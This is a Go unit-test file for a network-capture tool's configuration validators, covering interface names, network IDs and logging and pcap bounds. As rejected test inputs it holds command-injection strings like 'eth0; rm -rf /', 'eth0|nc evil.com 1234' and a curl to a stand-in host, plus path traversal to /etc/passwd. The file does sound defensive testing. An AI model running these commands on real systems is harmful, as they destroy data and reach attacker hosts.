package config

import (
	"strings"
	"testing"
)

func TestValidateInterfaceName(t *testing.T) {
	tests := []struct {
		name      string
		input     string
		wantError bool
		errorMsg  string
	}{
		// Valid interface names
		{"valid basic interface", "eth0", false, ""},
		{"valid wireless interface", "wlan0", false, ""},
		{"valid interface with dash", "en0-1", false, ""},
		{"valid interface with underscore", "eth_0", false, ""},
		{"valid interface with dot", "eth0.100", false, ""},
		{"valid complex interface", "veth123_test-1.vlan", false, ""},

		// Invalid interface names - security risks
		{"empty string", "", true, "interface name cannot be empty"},
		{"command injection semicolon", "eth0; rm -rf /", true, "interface name contains invalid characters"},
		{"command injection ampersand", "eth0 && curl evil.com", true, "interface name contains invalid characters"},
		{"command injection pipe", "eth0|nc evil.com 1234", true, "interface name contains invalid characters"},
		{"command injection backtick", "eth0`whoami`", true, "interface name contains invalid characters"},
		{"command injection dollar", "eth0$(whoami)", true, "interface name contains invalid characters"},
		{"path traversal", "../../../etc/passwd", true, "interface name contains invalid characters"},
		{"forward slash", "eth0/test", true, "interface name contains invalid characters"},
		{"backslash", "eth0\\test", true, "interface name contains invalid characters"},
		{"parentheses", "eth0(test)", true, "interface name contains invalid characters"},
		{"braces", "eth0{test}", true, "interface name contains invalid characters"},
		{"brackets", "eth0[test]", true, "interface name contains invalid characters"},
		{"angle brackets", "eth0<test>", true, "interface name contains invalid characters"},
		{"quotes", "eth0\"test", true, "interface name contains invalid characters"},
		{"single quotes", "eth0'test", true, "interface name contains invalid characters"},
		{"space", "eth0 test", true, "interface name contains invalid characters"},
		{"tab", "eth0\ttest", true, "interface name contains invalid characters"},
		{"newline", "eth0\ntest", true, "interface name contains invalid characters"},
		{"carriage return", "eth0\rtest", true, "interface name contains invalid characters"},

		// Length validation
		{"too long", strings.Repeat("a", 256), true, "interface name too long: 256 characters"},

		// Invalid characters
		{"invalid character @", "eth0@test", true, "interface name contains invalid characters"},
		{"invalid character #", "eth0#test", true, "interface name contains invalid characters"},
		{"invalid character %", "eth0%test", true, "interface name contains invalid characters"},
		{"invalid character ^", "eth0^test", true, "interface name contains invalid characters"},
		{"invalid character *", "eth0*test", true, "interface name contains invalid characters"},
		{"invalid character +", "eth0+test", true, "interface name contains invalid characters"},
		{"invalid character =", "eth0=test", true, "interface name contains invalid characters"},
		{"invalid character ?", "eth0?test", true, "interface name contains invalid characters"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validateInterfaceName(tt.input)
			if tt.wantError {
				if err == nil {
					t.Errorf("validateInterfaceName(%q) expected error but got nil", tt.input)
				} else if tt.errorMsg != "" && !strings.Contains(err.Error(), tt.errorMsg) {
					t.Errorf("validateInterfaceName(%q) error = %v, expected to contain %q", tt.input, err, tt.errorMsg)
				}
			} else {
				if err != nil {
					t.Errorf("validateInterfaceName(%q) unexpected error = %v", tt.input, err)
				}
			}
		})
	}
}

func TestGetFirstInterface(t *testing.T) {
	tests := []struct {
		name          string
		interfaceSpec string
		expectedIface string
		expectedError bool
		errorContains string
	}{
		// Valid cases
		{"empty interface defaults to any", "", "any", false, ""},
		{"single valid interface", "eth0", "eth0", false, ""},
		{"special case any", "any", "any", false, ""},
		{"special case all", "all", "all", false, ""},
		{"comma separated interfaces", "eth0,wlan0,en0", "eth0", false, ""},
		{"comma separated with spaces", "eth0, wlan0, en0", "eth0", false, ""},
		{"first interface with trailing spaces", " eth0 ,wlan0", "eth0", false, ""},

		// Edge cases that should work
		{"empty first segment, valid second", ",eth0,wlan0", "eth0", false, ""},
		{"multiple empty segments before valid", ",,eth0,wlan0", "eth0", false, ""},
		{"whitespace only segments before valid", " , , eth0, wlan0", "eth0", false, ""},
		{"all empty segments default to any", ",,,", "any", false, ""},
		{"whitespace only segments default to any", " , , ", "any", false, ""},

		// Special values mixed with regular interfaces
		{"any first in comma list", "any,eth0", "any", false, ""},
		{"all first in comma list", "all,eth0", "all", false, ""},
		{"valid interface before any", "eth0,any", "eth0", false, ""},

		// Error cases - malicious interfaces
		{"command injection in first interface", "eth0; rm -rf /", "", true, "invalid interface 'eth0; rm -rf /'"},
		{"command injection in second interface", "eth0,wlan0; rm -rf /", "eth0", false, ""}, // Should succeed with first valid interface
		{"all interfaces malicious", "eth0; rm -rf /,wlan0; curl evil.com", "", true, "invalid interface 'eth0; rm -rf /'"},
		{"path traversal", "../../../etc/passwd", "", true, "invalid interface '../../../etc/passwd'"},
		{"invalid characters", "eth0@test", "", true, "invalid interface 'eth0@test'"},
		{"too long interface", strings.Repeat("a", 256), "", true, "invalid interface"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			cfg := &Config{}
			cfg.Capture.Interface = tt.interfaceSpec

			iface, err := cfg.GetFirstInterface()

			if tt.expectedError {
				if err == nil {
					t.Errorf("GetFirstInterface(%q) expected error but got nil, result: %s", tt.interfaceSpec, iface)
				} else if tt.errorContains != "" && !strings.Contains(err.Error(), tt.errorContains) {
					t.Errorf("GetFirstInterface(%q) error = %v, expected to contain %q", tt.interfaceSpec, err, tt.errorContains)
				}
			} else {
				if err != nil {
					t.Errorf("GetFirstInterface(%q) unexpected error = %v", tt.interfaceSpec, err)
				}
				if iface != tt.expectedIface {
					t.Errorf("GetFirstInterface(%q) = %q, expected %q", tt.interfaceSpec, iface, tt.expectedIface)
				}
			}
		})
	}
}

func TestGetFirstInterface_SecurityFocused(t *testing.T) {
	// These are specific security-focused test cases that verify
	// the most dangerous command injection scenarios are blocked
	maliciousInputs := []struct {
		name  string
		input string
	}{
		{"shell command execution", "eth0; rm -rf /"},
		{"background process", "eth0 && curl evil.com &"},
		{"pipe to dangerous command", "eth0|nc evil.com 1234"},
		{"backtick command substitution", "eth0`whoami`"},
		{"dollar command substitution", "eth0$(whoami)"},
		{"newline injection", "eth0\nwhoami"},
		{"path traversal to system files", "../../../etc/passwd"},
		{"null byte injection", "eth0\x00; rm -rf /"},
		{"unicode control characters", "eth0\u0000\u001f"},
	}

	for _, tt := range maliciousInputs {
		t.Run(tt.name, func(t *testing.T) {
			cfg := &Config{}
			cfg.Capture.Interface = tt.input

			iface, err := cfg.GetFirstInterface()
			if err == nil {
				t.Errorf("Security test failed: GetFirstInterface(%q) should reject malicious input but returned: %s", tt.input, iface)
			}

			// The main security check is that the input was rejected
			// Error messages may contain the input for debugging purposes, which is acceptable
			// as long as the dangerous input never reaches command execution
		})
	}
}

func TestGetAllInterfaces(t *testing.T) {
	tests := []struct {
		name               string
		interfaceSpec      string
		expectedInterfaces []string
		expectedError      bool
		errorContains      string
	}{
		// Valid cases
		{"empty interface defaults to any", "", []string{"any"}, false, ""},
		{"single valid interface", "eth0", []string{"eth0"}, false, ""},
		{"special case any", "any", []string{"any"}, false, ""},
		{"special case all", "all", []string{"all"}, false, ""},
		{"two interfaces", "eth0,wlan0", []string{"eth0", "wlan0"}, false, ""},
		{"three interfaces with spaces", "eth0, wlan0, en0", []string{"eth0", "wlan0", "en0"}, false, ""},
		{"mixed special and regular", "any,eth0", []string{"any", "eth0"}, false, ""},

		// Edge cases that should work
		{"skip empty segments", "eth0,,wlan0", []string{"eth0", "wlan0"}, false, ""},
		{"whitespace handling", " eth0 , wlan0 ", []string{"eth0", "wlan0"}, false, ""},
		{"all empty segments default to any", ",,,", []string{"any"}, false, ""},

		// Error cases
		{"malicious interface first", "eth0; rm -rf /", nil, true, "invalid interface 'eth0; rm -rf /'"},
		{"malicious interface second", "eth0,wlan0; curl evil.com", nil, true, "invalid interface 'wlan0; curl evil.com'"},
		{"all interfaces malicious", "eth0; rm -rf /,wlan0; curl evil.com", nil, true, "invalid interface"},
		{"path traversal", "../../../etc/passwd", nil, true, "invalid interface"},
		{"invalid characters", "eth0@test", nil, true, "invalid interface"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			cfg := &Config{}
			cfg.Capture.Interface = tt.interfaceSpec

			interfaces, err := cfg.GetAllInterfaces()

			if tt.expectedError {
				if err == nil {
					t.Errorf("GetAllInterfaces(%q) expected error but got nil, result: %v", tt.interfaceSpec, interfaces)
				} else if tt.errorContains != "" && !strings.Contains(err.Error(), tt.errorContains) {
					t.Errorf("GetAllInterfaces(%q) error = %v, expected to contain %q", tt.interfaceSpec, err, tt.errorContains)
				}
			} else {
				if err != nil {
					t.Errorf("GetAllInterfaces(%q) unexpected error = %v", tt.interfaceSpec, err)
				}
				if len(interfaces) != len(tt.expectedInterfaces) {
					t.Errorf("GetAllInterfaces(%q) = %v, expected %v (length mismatch)", tt.interfaceSpec, interfaces, tt.expectedInterfaces)
				} else {
					for i, expectedIface := range tt.expectedInterfaces {
						if interfaces[i] != expectedIface {
							t.Errorf("GetAllInterfaces(%q)[%d] = %q, expected %q", tt.interfaceSpec, i, interfaces[i], expectedIface)
						}
					}
				}
			}
		})
	}
}

func TestConfig_ValidateAndSetDefaults(t *testing.T) {
	cfg := &Config{NetworkID: "Test-Network-01"}
	err := cfg.ValidateAndSetDefaults()
	if err != nil {
		t.Fatalf("Unexpected error: %v", err)
	}

	// Test that defaults are set correctly
	if cfg.Capture.Interface != "any" {
		t.Errorf("Expected default interface to be 'any', got %q", cfg.Capture.Interface)
	}

	if cfg.Logging.Level != "info" {
		t.Errorf("Expected default log level to be 'info', got %q", cfg.Logging.Level)
	}

	// Test logging defaults
	if cfg.Logging.MaxSizeMB != 50 {
		t.Errorf("Expected default MaxSizeMB to be 50, got %d", cfg.Logging.MaxSizeMB)
	}
	if cfg.Logging.LogRetentionDays != 7 {
		t.Errorf("Expected default LogRetentionDays to be 7, got %d", cfg.Logging.LogRetentionDays)
	}
	if cfg.Logging.MaxBackups != 5 {
		t.Errorf("Expected default MaxBackups to be 5, got %d", cfg.Logging.MaxBackups)
	}
}

func TestConfig_ValidateAndSetDefaults_MaxSizeMB(t *testing.T) {
	tests := []struct {
		name        string
		input       int64
		expected    int64
		expectError bool
		errorMsg    string
	}{
		{"zero defaults to 50", 0, 50, false, ""},
		{"below minimum errors", 5, 5, true, "must be at least 10MB"},
		{"at minimum preserved", 10, 10, false, ""},
		{"valid value preserved", 50, 50, false, ""},
		{"valid value preserved", 200, 200, false, ""},
		{"at maximum preserved", 500, 500, false, ""},
		{"above maximum errors", 6000, 6000, true, "must be at most 500MB"},
		{"above maximum errors", 10000, 10000, true, "must be at most 500MB"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			cfg := &Config{NetworkID: "Test-Network-01"}
			cfg.Logging.MaxSizeMB = tt.input
			err := cfg.ValidateAndSetDefaults()
			if tt.expectError {
				if err == nil {
					t.Errorf("Expected error for MaxSizeMB=%d, got nil", tt.input)
				} else if tt.errorMsg != "" && !strings.Contains(err.Error(), tt.errorMsg) {
					t.Errorf("Expected error to contain %q, got %q", tt.errorMsg, err.Error())
				}
			} else {
				if err != nil {
					t.Errorf("Unexpected error for MaxSizeMB=%d: %v", tt.input, err)
				} else if cfg.Logging.MaxSizeMB != tt.expected {
					t.Errorf("MaxSizeMB: input %d, expected %d, got %d", tt.input, tt.expected, cfg.Logging.MaxSizeMB)
				}
			}
		})
	}
}

func TestConfig_ValidateAndSetDefaults_LogRetentionDays(t *testing.T) {
	tests := []struct {
		name        string
		input       int
		expected    int
		expectError bool
		errorMsg    string
	}{
		{"zero defaults to 7", 0, 7, false, ""},
		{"below minimum errors", -1, -1, true, "must be at least 1"},
		{"at minimum preserved", 1, 1, false, ""},
		{"valid value preserved", 7, 7, false, ""},
		{"valid value preserved", 14, 14, false, ""},
		{"at maximum preserved", 30, 30, false, ""},
		{"above maximum errors", 60, 60, true, "must be at most 30"},
		{"above maximum errors", 365, 365, true, "must be at most 30"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			cfg := &Config{NetworkID: "Test-Network-01"}
			cfg.Logging.LogRetentionDays = tt.input
			err := cfg.ValidateAndSetDefaults()
			if tt.expectError {
				if err == nil {
					t.Errorf("Expected error for LogRetentionDays=%d, got nil", tt.input)
				} else if tt.errorMsg != "" && !strings.Contains(err.Error(), tt.errorMsg) {
					t.Errorf("Expected error to contain %q, got %q", tt.errorMsg, err.Error())
				}
			} else {
				if err != nil {
					t.Errorf("Unexpected error for LogRetentionDays=%d: %v", tt.input, err)
				} else if cfg.Logging.LogRetentionDays != tt.expected {
					t.Errorf("LogRetentionDays: input %d, expected %d, got %d", tt.input, tt.expected, cfg.Logging.LogRetentionDays)
				}
			}
		})
	}
}

func TestConfig_ValidateAndSetDefaults_MaxBackups(t *testing.T) {
	tests := []struct {
		name        string
		input       int
		expected    int
		expectError bool
		errorMsg    string
	}{
		{"zero defaults to 5", 0, 5, false, ""},
		{"below minimum errors", -1, -1, true, "must be at least 1"},
		{"at minimum preserved", 1, 1, false, ""},
		{"valid value preserved", 3, 3, false, ""},
		{"default value preserved", 5, 5, false, ""},
		{"valid value preserved", 7, 7, false, ""},
		{"at maximum preserved", 10, 10, false, ""},
		{"above maximum errors", 20, 20, true, "must be at most 10"},
		{"above maximum errors", 100, 100, true, "must be at most 10"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			cfg := &Config{NetworkID: "Test-Network-01"}
			cfg.Logging.MaxBackups = tt.input
			err := cfg.ValidateAndSetDefaults()
			if tt.expectError {
				if err == nil {
					t.Errorf("Expected error for MaxBackups=%d, got nil", tt.input)
				} else if tt.errorMsg != "" && !strings.Contains(err.Error(), tt.errorMsg) {
					t.Errorf("Expected error to contain %q, got %q", tt.errorMsg, err.Error())
				}
			} else {
				if err != nil {
					t.Errorf("Unexpected error for MaxBackups=%d: %v", tt.input, err)
				} else if cfg.Logging.MaxBackups != tt.expected {
					t.Errorf("MaxBackups: input %d, expected %d, got %d", tt.input, tt.expected, cfg.Logging.MaxBackups)
				}
			}
		})
	}
}

func TestValidateNetworkID(t *testing.T) {
	tests := []struct {
		name        string
		networkID   string
		expectError bool
		errorMsg    string
	}{
		// Valid network IDs
		{"valid simple", "Network1", false, ""},
		{"valid with hyphen", "HQ-Firewall-01", false, ""},
		{"valid with underscore", "Branch_Office_1", false, ""},
		{"valid with space", "Main Office Network", false, ""},
		{"valid single char", "A", false, ""},
		{"valid numbers only", "12345", false, ""},
		{"valid max length", strings.Repeat("a", 64), false, ""},
		{"starts with space gets trimmed", " Valid", false, ""},
		{"ends with space gets trimmed", "Valid ", false, ""},

		// Invalid network IDs
		{"empty string", "", true, "network_id is required"},
		{"whitespace only", "   ", true, "network_id is required"},
		{"placeholder value", "REPLACE_WITH_YOUR_NETWORK_ID", true, "not the placeholder"},
		{"too long", strings.Repeat("a", 65), true, "must be 64 characters or less"},
		{"starts with hyphen", "-Invalid", true, "must start and end with a letter or number"},
		{"ends with hyphen", "Invalid-", true, "must start and end with a letter or number"},
		{"starts with underscore", "_Invalid", true, "must start and end with a letter or number"},
		{"ends with underscore", "Invalid_", true, "must start and end with a letter or number"},
		{"contains special char @", "Network@Home", true, "can only contain letters"},
		{"contains special char #", "Network#1", true, "can only contain letters"},
		{"contains special char !", "Network!", true, "can only contain letters"},
		{"contains newline", "Network\n1", true, "can only contain letters"},
		{"contains tab", "Network\t1", true, "can only contain letters"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validateNetworkID(tt.networkID)
			if tt.expectError {
				if err == nil {
					t.Errorf("validateNetworkID(%q) expected error but got nil", tt.networkID)
				} else if tt.errorMsg != "" && !strings.Contains(err.Error(), tt.errorMsg) {
					t.Errorf("validateNetworkID(%q) error = %v, expected to contain %q", tt.networkID, err, tt.errorMsg)
				}
			} else {
				if err != nil {
					t.Errorf("validateNetworkID(%q) unexpected error = %v", tt.networkID, err)
				}
			}
		})
	}
}

func TestConfig_PcapIngest_Defaults(t *testing.T) {
	cfg := &Config{NetworkID: "Test-Network-01"}
	err := cfg.ValidateAndSetDefaults()
	if err != nil {
		t.Fatalf("Unexpected error: %v", err)
	}
	if cfg.PcapIngest.PollIntervalSeconds != 10 {
		t.Errorf("Expected default PollIntervalSeconds to be 10, got %d", cfg.PcapIngest.PollIntervalSeconds)
	}
	if cfg.PcapIngest.FileStableSeconds != 5 {
		t.Errorf("Expected default FileStableSeconds to be 5, got %d", cfg.PcapIngest.FileStableSeconds)
	}
	if cfg.PcapIngest.Enabled {
		t.Error("Expected PcapIngest.Enabled to default to false")
	}
}

func TestConfig_PcapIngest_Validation(t *testing.T) {
	// Enabled without WatchDir should fail
	cfg := &Config{NetworkID: "Test-Network-01"}
	cfg.PcapIngest.Enabled = true
	err := cfg.ValidateAndSetDefaults()
	if err == nil {
		t.Error("Expected error when PcapIngest enabled without WatchDir")
	} else if !strings.Contains(err.Error(), "watch_dir is required") {
		t.Errorf("Expected error about watch_dir, got: %v", err)
	}

	// Enabled with WatchDir should succeed
	cfg = &Config{NetworkID: "Test-Network-01"}
	cfg.PcapIngest.Enabled = true
	cfg.PcapIngest.WatchDir = "/tmp/pcap-ingest"
	err = cfg.ValidateAndSetDefaults()
	if err != nil {
		t.Errorf("Unexpected error: %v", err)
	}

	// Disabled without WatchDir should succeed
	cfg = &Config{NetworkID: "Test-Network-01"}
	cfg.PcapIngest.Enabled = false
	err = cfg.ValidateAndSetDefaults()
	if err != nil {
		t.Errorf("Unexpected error: %v", err)
	}
}

func TestConfig_PcapIngest_Bounds(t *testing.T) {
	tests := []struct {
		name         string
		pollInterval int
		fileStable   int
		expectPoll   int
		expectStable int
	}{
		{"defaults when zero", 0, 0, 10, 5},
		{"clamp poll below min", -5, 0, 1, 5},
		{"clamp poll above max", 500, 0, 300, 5},
		{"clamp stable below min", 0, -3, 10, 1},
		{"clamp stable above max", 0, 100, 10, 60},
		{"valid values preserved", 30, 10, 30, 10},
		{"min values preserved", 1, 1, 1, 1},
		{"max values preserved", 300, 60, 300, 60},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			cfg := &Config{NetworkID: "Test-Network-01"}
			cfg.PcapIngest.PollIntervalSeconds = tt.pollInterval
			cfg.PcapIngest.FileStableSeconds = tt.fileStable
			err := cfg.ValidateAndSetDefaults()
			if err != nil {
				t.Fatalf("Unexpected error: %v", err)
			}
			if cfg.PcapIngest.PollIntervalSeconds != tt.expectPoll {
				t.Errorf("PollIntervalSeconds: input %d, expected %d, got %d", tt.pollInterval, tt.expectPoll, cfg.PcapIngest.PollIntervalSeconds)
			}
			if cfg.PcapIngest.FileStableSeconds != tt.expectStable {
				t.Errorf("FileStableSeconds: input %d, expected %d, got %d", tt.fileStable, tt.expectStable, cfg.PcapIngest.FileStableSeconds)
			}
		})
	}
}

func TestConfig_ValidateAndSetDefaults_NetworkID(t *testing.T) {
	// Test that missing network_id causes error
	cfg := &Config{}
	err := cfg.ValidateAndSetDefaults()
	if err == nil {
		t.Error("Expected error for missing network_id, got nil")
	} else if !strings.Contains(err.Error(), "network_id is required") {
		t.Errorf("Expected error to contain 'network_id is required', got %q", err.Error())
	}

	// Test that valid network_id passes
	cfg = &Config{NetworkID: "Valid-Network-01"}
	err = cfg.ValidateAndSetDefaults()
	if err != nil {
		t.Errorf("Unexpected error for valid network_id: %v", err)
	}

	// Test that network_id is trimmed
	cfg = &Config{NetworkID: "  Trimmed-Network  "}
	err = cfg.ValidateAndSetDefaults()
	if err != nil {
		t.Errorf("Unexpected error: %v", err)
	}
	if cfg.NetworkID != "Trimmed-Network" {
		t.Errorf("Expected network_id to be trimmed to 'Trimmed-Network', got %q", cfg.NetworkID)
	}
}
